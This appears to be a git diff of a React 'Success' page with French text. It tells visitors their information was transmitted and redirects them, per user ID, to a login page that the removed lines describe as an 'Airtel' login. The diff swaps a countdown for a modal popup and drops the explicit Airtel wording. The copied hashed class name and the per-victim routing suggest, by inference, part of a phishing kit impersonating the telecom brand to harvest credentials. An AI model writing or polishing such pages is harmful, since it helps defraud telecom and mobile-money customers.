@@ -6,7 +6,7 @@ function Success() {
   const { user } = useParams()
   const userId = user || 'default'
   const [name, setName] = useState("Client")
-  const [countdown, setCountdown] = useState(4)
+  const [showPopup, setShowPopup] = useState(true)
 
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search)
@@ -14,35 +14,55 @@ function Success() {
     if (urlName) {
       setName(decodeURIComponent(urlName))
     }
-    
-    if (countdown > 0) {
-      const id = setTimeout(() => setCountdown(c => c - 1), 1000)
-      return () => clearTimeout(id)
-    }
-    
-    if (countdown === 0) {
+
+    const timer = setTimeout(() => {
+      setShowPopup(false)
       setTimeout(() => {
         navigate(`/${userId}/login`)
-      }, 1000)
-    }
-  }, [countdown])
+      }, 300)
+    }, 2500)
+
+    return () => clearTimeout(timer)
+  }, [])
+
+  if (!showPopup) {
+    return null
+  }
 
   return (
-    <div className="_successcont_gxo1w_1">
-      <div style={{ textAlign: 'center', marginBottom: '20px' }}>
-        <img src="/assets/image.png" alt="Logo" style={{ height: '55px', width: 'auto', maxWidth: '130px' }} />
+    <div className="_successcont_gxo1w_1" style={{
+      position: 'fixed',
+      top: 0,
+      left: 0,
+      width: '100%',
+      height: '100%',
+      backgroundColor: 'rgba(0, 0, 0, 0.5)',
+      display: 'flex',
+      justifyContent: 'center',
+      alignItems: 'center',
+      zIndex: 9999
+    }}>
+      <div style={{
+        background: 'white',
+        padding: '40px',
+        borderRadius: '15px',
+        textAlign: 'center',
+        maxWidth: '400px',
+        boxShadow: '0 10px 30px rgba(0, 0, 0, 0.3)'
+      }}>
+        <div style={{ textAlign: 'center', marginBottom: '20px' }}>
+          <img src="/assets/image.png" alt="Logo" style={{ height: '55px', width: 'auto', maxWidth: '120px' }} />
+        </div>
+        <h1 style={{ fontSize: '24px', margin: '0 0 15px' }}>
+          Succès ! Félicitations. 🎉 
+        </h1>
+        <p style={{ margin: '0 0 10px', color: '#666' }}>
+          Vos informations ont été transmises avec succès.
+        </p>
+        <p style={{ margin: 0, color: '#666', fontSize: '14px' }}>
+          Redirection vers la page de connexion...
+        </p>
       </div>
-      <h1>
-        Succès ! Félicitations. 🎉 
-        <br />
-        {name || "Client"}
-      </h1>
-      <p>Vos informations ont été transmises avec succès.</p>
-      <p>
-        Pour l'étape suivante, vous devez confirmer vos
-        <b style={{ color: " rgb(9, 20, 37)" }}> informations Airtel.</b>
-      </p>
-      <span>Redirection vers la page de connexion Airtel... {countdown}s</span>
     </div>
   )
 }
